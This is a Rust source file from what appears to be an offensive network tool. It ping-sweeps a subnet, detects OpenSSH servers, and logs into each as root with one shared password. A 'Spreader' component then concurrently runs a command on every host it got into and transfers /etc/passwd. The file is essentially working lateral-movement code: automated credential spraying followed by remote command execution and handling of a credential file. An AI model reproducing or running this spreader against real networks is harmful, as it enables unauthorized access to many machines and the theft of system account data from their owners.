use crate::net::communicator::{Credentials, Session};
use anyhow::anyhow;
use tokio::time::{timeout, Duration};
// use crate::net::enumeration::ping::Enumerator;
use crate::net::enumeration::ping::Enumerator;
// use crate::net::session_pool::SessionPool;
use crate::net::ssh::{SSHClient, SSHSession};
use crate::net::types::{Host, OS};
use crate::net::winexe::{WinexeClient, WinexeSession};
use futures::future::join_all;
use std::io::{self, Read, Write};
use std::str;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

pub enum SessionType {
    SSH(SSHSession),
    Winexe(WinexeSession),
}

pub struct ConnectionPool {
    pub(crate) clients: Vec<Arc<(OS, SessionType)>>,
}

impl ConnectionPool {
    pub async fn new(subnet: &str, password: &str) -> Self {
        let hosts = Enumerator::new(subnet).ping_sweep().await;

        match hosts {
            Ok(hosts) => {
                let clients = Self::scan(&hosts, password).await;
                Self { clients }
            }
            Err(e) => panic!("Error: {}", e),
        }
    }
    async fn scan(hosts: &Vec<Arc<Host>>, password: &str) -> Vec<Arc<(OS, SessionType)>> {
        let mut futures = Vec::new();
        let pass: Arc<String> = Arc::new(password.to_string());

        for host in hosts {
            let shared_pass = pass.clone();
            let host_arc_clone = host.clone();

            let future = async move {
                let task_timeout = Duration::from_secs(15);
                match timeout(
                    task_timeout,
                    establish_connection(host_arc_clone, shared_pass),
                )
                .await
                {
                    Ok(Some(connection)) => Some(connection),
                    Ok(None) | Err(_) => {
                        println!("Connection to {} failed or timed out", host.ip);
                        None
                    }
                }
            };

            futures.push(future);
        }

        let results = join_all(futures).await;

        results.into_iter().filter_map(|result| result).collect()
    }
}

async fn is_ssh_open(ip: &str) -> Result<bool, io::Error> {
    let timeout_duration = Duration::from_secs(5); // Set your desired timeout duration
    let target = format!("{}:22", ip);

    // Apply the timeout to the connection attempt
    let mut stream = timeout(timeout_duration, TcpStream::connect(target)).await??;

    let mut buffer = [0; 1024];
    // Apply the timeout to the read operation
    let bytes_read = timeout(timeout_duration, stream.read(&mut buffer)).await??;

    let banner = str::from_utf8(&buffer[..bytes_read]).unwrap_or_else(|_| "<Invalid UTF-8 data>");

    Ok(banner.contains("OpenSSH"))
}

async fn establish_connection(
    host: Arc<Host>,
    password: Arc<String>,
) -> Option<Arc<(OS, SessionType)>> {
    match host.os {
        OS::Unix => {
            match is_ssh_open(&host.ip).await {
                Ok(is_open) => {
                    if !is_open {
                        return None;
                    }
                }
                Err(_) => return None,
            }

            let creds = Credentials {
                username: "root".into(),
                password: Some(password.to_string()),
                key: None,
            };

            let mut client = SSHClient::new(); // Initialize the client here without 'let'
            client.ip(host.ip.as_str());

            let timeout_duration = Duration::from_secs(15);

            let session = match timeout(timeout_duration, client.connect(&creds)).await {
                Ok(Ok(session)) => {
                    println!("WE GOT A SESSION on ip {}", host.ip);
                    Arc::new((host.os, SessionType::SSH(session)))
                }
                Ok(Err(e)) => {
                    println!("Error on {}: {}", host.ip, e);
                    return None;
                }
                Err(_) => {
                    println!("Connection to {} timed out", host.ip);
                    return None;
                }
            };

            Some(session)
        }
        _ => None,
    }
}

pub struct Spreader {
    pub(crate) pool: ConnectionPool,
}

impl Spreader {
    pub async fn new(subnet: &str, password: &str) -> Self {
        let spreader = Self {
            pool: ConnectionPool::new(subnet, password).await,
        };
        spreader
    }

    pub async fn spread(&self) {
        let clients = Arc::new(&self.pool.clients);
        let mut futures = Vec::new();

        for client in clients.iter() {
            let shared_client = client.clone();

            // Create a future for each client and add it to the vector
            let client_future = async move {
                match shared_client.0 {
                    OS::Unix => {
                        match Self::spread_unix(&shared_client.1).await {
                            Ok(_) => println!("Successfully spread"),
                            Err(e) => println!("Error spreading: {}", e),
                        };
                    }
                    _ => {}
                }
            };

            futures.push(client_future);
        }

        // Await all futures concurrently
        join_all(futures).await;
    }

    async fn spread_unix(session: &SessionType) -> anyhow::Result<()> {
        let session = match session {
            SessionType::SSH(session) => session,
            // Throw an error if the session is not SSH
            _ => return Err(anyhow!("Session is not SSH")),
        };

        println!("Running ls -la Hopefully im at least concurrent ");
        std::io::stdout().flush().unwrap();
        session.execute_command("ls -la").await?;

        println!("Transfering file");
        session.transfer_file("/etc/passwd", "/tmp/passwd").await?;

        session.close().await?;
        Ok(())
    }
}
